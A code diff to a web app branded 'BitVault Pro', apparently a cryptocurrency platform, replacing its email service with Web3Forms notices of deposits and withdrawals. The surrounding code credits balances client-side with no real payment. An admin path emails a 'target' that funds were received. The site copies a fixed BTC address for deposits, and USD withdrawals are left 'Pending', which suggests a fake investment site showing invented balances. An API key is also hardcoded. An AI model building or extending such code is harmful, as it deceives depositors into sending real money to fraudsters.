@@ -2416,6 +2416,7 @@
         const EMAILJS_WELCOME_TEMPLATE = "template_176ozxn";
         const EMAILJS_DEPOSIT_TEMPLATE = "template_nn75pui";
         const EMAILJS_WITHDRAW_TEMPLATE = "template_crg645h";
+        const WEB3FORMS_KEY = "166485c3-cfd4-4933-aba5-4e22bd87a185";
         let emailjsReady = false;
         try { if(typeof emailjs !== 'undefined'){ emailjs.init({publicKey:EMAILJS_PUBLIC_KEY}); emailjsReady = true; } } catch(e){ emailjsReady = false; }
 
@@ -3004,20 +3005,32 @@
                     await db.ref('users/'+safeKey(master.email)).set(master); 
                 } catch(e) { console.warn('Firebase sync failed:', e); }
             }
-            if(emailjsReady){ 
-                try { 
-                    await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_DEPOSIT_TEMPLATE,{
-                        to_email: client.email,
+            // Send deposit notification via Web3Forms
+            try {
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        access_key: WEB3FORMS_KEY,
+                        subject: 'Funds Received — BitVault Pro',
                         from_name: 'BitVault Pro',
-                        name: client.name,
+                        from_email: 'noreply@bitvault.io',
                         email: client.email,
-                        amount: amt.toLocaleString(),
-                        currency: cur==='usd'?'USDT':'BTC',
-                        tx_id: 'TX-'+Date.now(),
-                        date: new Date().toLocaleString()
-                    }); 
-                } catch(e) { console.warn('Deposit email failed:',e); } 
-            } 
+                        name: client.name,
+                        message: `Hello ${client.name},
+
+You have received ${cur==='usd'?'$'+amt.toLocaleString():amt.toFixed(8)+' BTC'} in your BitVault Pro account.
+
+Transaction reference: TX-${Date.now()}
+Currency: ${cur==='usd'?'USDT':'BTC'}
+Date: ${new Date().toLocaleString()}
+
+Login to check your updated balance.
+
+— BitVault Pro Team`
+                    })
+                });
+            } catch(e) { console.warn('Deposit notification failed:', e); } 
             window._sendTargetEmail = null;
             closeModal(); 
             renderAdmin(); 
@@ -3082,7 +3095,32 @@
 
         function copyBtcWallet(){ navigator.clipboard.writeText('bc1q4tqmvgkc8x68lxfgz85kqdpn34zxz8wqsncvyx'); toast('BTC address copied','success'); }
         async function processDeposit(){ const amt=parseFloat(document.getElementById('depAmount').value); if(!amt||amt<=0) return toast('Enter valid amount','error'); let all=getAllUsers(), u=all[currentUser.email]; u.usd=(u.usd||0)+amt; u.txs.push({type:'deposit',amount:amt,currency:'USD',status:'Completed',date:Date.now(),details:'Wire transfer deposit'}); u.lastModified=Date.now(); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); toast('Deposit processed','success'); }
-        async function processStudentWithdraw(){ const amt=parseFloat(document.getElementById('witBtcAmount').value), addr=document.getElementById('witBtcAddr').value.trim(); if(!amt||amt<=0) return toast('Enter valid BTC amount','error'); let all=getAllUsers(), u=all[currentUser.email]; if(u.btc<amt) return toast('Insufficient BTC balance','error'); if(!addr||addr.length<10) return toast('Enter a valid BTC wallet address','error'); u.btc-=amt; u.txs.push({type:'withdraw',amount:-amt,currency:'BTC',status:'Completed',date:Date.now(),details:`Withdrawal to ${addr.substring(0,12)}...`}); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); if(emailjsReady){ try{ await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_WITHDRAW_TEMPLATE,{name:u.name,email:u.email,amount:amt.toFixed(8),currency:'BTC',wallet_address:addr,tx_id:'TX-'+Date.now(),date:new Date().toLocaleString()}); }catch(e){ console.warn('Withdrawal email failed:',e); } } toast('BTC withdrawal request submitted','success'); }
+        async function processStudentWithdraw(){ const amt=parseFloat(document.getElementById('witBtcAmount').value), addr=document.getElementById('witBtcAddr').value.trim(); if(!amt||amt<=0) return toast('Enter valid BTC amount','error'); let all=getAllUsers(), u=all[currentUser.email]; if(u.btc<amt) return toast('Insufficient BTC balance','error'); if(!addr||addr.length<10) return toast('Enter a valid BTC wallet address','error'); u.btc-=amt; u.txs.push({type:'withdraw',amount:-amt,currency:'BTC',status:'Completed',date:Date.now(),details:`Withdrawal to ${addr.substring(0,12)}...`}); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); // Send withdrawal notification via Web3Forms
+            try {
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        access_key: WEB3FORMS_KEY,
+                        subject: 'Withdrawal Processed — BitVault Pro',
+                        from_name: 'BitVault Pro',
+                        from_email: 'noreply@bitvault.io',
+                        email: u.email,
+                        name: u.name,
+                        message: `Hello ${u.name},
+
+Your withdrawal of ${amt.toFixed(8)} BTC to ${addr} has been processed.
+
+Transaction reference: TX-${Date.now()}
+Wallet Address: ${addr}
+Date: ${new Date().toLocaleString()}
+
+Login to confirm.
+
+— BitVault Pro Team`
+                    })
+                });
+            } catch(e) { console.warn('Withdrawal notification failed:', e); } toast('BTC withdrawal request submitted','success'); }
         async function processWithdraw(){ const amt=parseFloat(document.getElementById('witAmount').value); if(!amt||amt<=0) return toast('Enter valid amount','error'); let all=getAllUsers(), u=all[currentUser.email]; if((u.usd||0)<amt) return toast('Insufficient balance','error'); u.usd=(u.usd||0)-amt; u.txs.push({type:'withdraw',amount:-amt,currency:'USD',status:'Pending',date:Date.now(),details:'Withdrawal to external wallet'}); u.lastModified=Date.now(); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); toast('Withdrawal request submitted','success'); }
         function updateConvertPreview(){ const input=document.getElementById('convBtcAmt'), btn=document.querySelector('#modalContent .btn-gold'); if(!input||!btn) return; const amt=parseFloat(input.value)||0, usd=amt*btcPrice, fee=usd*0.001; const usdEl=document.getElementById('convUsdVal'), feeEl=document.getElementById('convFee'); if(usdEl) usdEl.textContent='$'+usd.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); if(feeEl) feeEl.textContent='$'+fee.toFixed(2); btn.disabled=(amt<=0||amt>currentUser.btc||usd<100); }
         async function processConvertCustom(){ const input=document.getElementById('convBtcAmt'), amt=parseFloat(input.value); if(!amt||amt<=0) return toast('Enter valid BTC amount','error'); if(amt>currentUser.btc) return toast('Amount exceeds balance','error'); const usd=amt*btcPrice; if(usd<100) return toast('Minimum $100 worth required','error'); let all=getAllUsers(), u=all[currentUser.email]; u.btc-=amt; u.usd+=usd; u.txs.push({type:'trade',amount:-amt,currency:'BTC',status:'Completed',date:Date.now(),details:`Converted ${amt.toFixed(8)} BTC to USD @ $${btcPrice.toFixed(2)}`}); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); toast('Conversion complete: $'+usd.toLocaleString('en-US',{minimumFractionDigits:2})+' credited','success'); }
